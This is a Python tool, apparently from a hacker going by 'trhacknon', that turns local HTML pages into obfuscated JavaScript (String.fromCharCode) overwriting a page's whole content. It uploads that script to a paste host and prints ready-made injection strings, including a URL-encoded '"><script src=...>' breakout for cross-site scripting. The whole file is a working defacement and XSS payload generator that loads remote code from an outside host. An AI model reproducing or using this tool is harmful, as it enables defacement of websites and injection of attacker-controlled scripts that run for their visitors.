import os
import glob
import requests
from bs4 import BeautifulSoup
from pyfiglet import Figlet
from colorama import init, Fore, Style

init()
custom_fig = Figlet(font='slant')
print(Fore.CYAN + custom_fig.renderText('trhacknon'))

def convert_html_to_jso(filename):
    with open(filename, 'r') as f:
        soup = BeautifulSoup(f.read(), 'html.parser')
        inner_html = str(soup)
        jso_content = "document.documentElement.innerHTML=String.fromCharCode(" + ','.join(str(ord(c)) for c in inner_html) + ")"
        new_filename = os.path.splitext(filename)[0] + '.js'
        with open(new_filename, 'w') as jso_file:
            jso_file.write(jso_content)
        return new_filename

def send_file_to_api(filename):
    with open(filename, 'r') as f:
        data = f.read()
    url = "https://hastebytrhacknon.trhacknon.repl.co/documents"
    r = requests.post(url, data=data.encode())
    key = r.json()["key"]
    js_url = '<script type="text/javascript" src="https://hastebytrhacknon.trhacknon.repl.co/raw/{key}"></script>'.format(key=key)
    url_encoded = '%22%3E%3Cscript%20type=%22text/javascript%22%20src=%22https://hastebin.com/raw/{key}%22%3E%3C%2Fscript%3E'.format(key=key)
    return js_url, url_encoded

html_files = glob.glob("*.html")
print("Sélectionnez les fichiers à convertir et à envoyer à l'API :")
for i, filename in enumerate(html_files):
    print("{}) {}".format(i+1, filename))
selection = input("> ")
selected_files = [html_files[int(i)-1] for i in selection.split(',')]

for filename in selected_files:
    jso_filename = convert_html_to_jso(filename)
    js_url, url_encoded = send_file_to_api(jso_filename)
    print("Fichier JSO créé : {}".format(jso_filename))
    print("URL du fichier JS : {}".format(js_url))
    print("URL encodée : {}".format(url_encoded))
